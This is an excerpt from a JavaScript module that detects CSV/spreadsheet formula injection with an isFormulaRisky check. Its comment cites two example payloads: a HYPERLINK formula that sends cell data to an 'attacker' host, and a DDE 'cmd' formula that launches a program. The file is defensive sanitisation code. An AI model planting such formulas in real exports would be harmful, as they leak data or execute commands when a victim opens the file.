 ...
 * Excel, LibreOffice Calc and Google Sheets all evaluate `=`, `+`, `-` and `@`; OWASP adds
 * TAB (0x09) and CR (0x0D), which some readers strip before deciding. A value such as
 * `=HYPERLINK("http://attacker/?"&A1)` or `=cmd|'/c calc'!A1` sitting in an ordinary column
 * therefore becomes executable the moment someone opens the export - the database value never
 * has to be malicious, only rendered.
 *
...
export function isFormulaRisky(value) {
  ...
  const stringValue = String(value);
  return FORMULA_TRIGGER.test(stringValue) && !NUMERIC_LITERAL.test(stringValue);
}
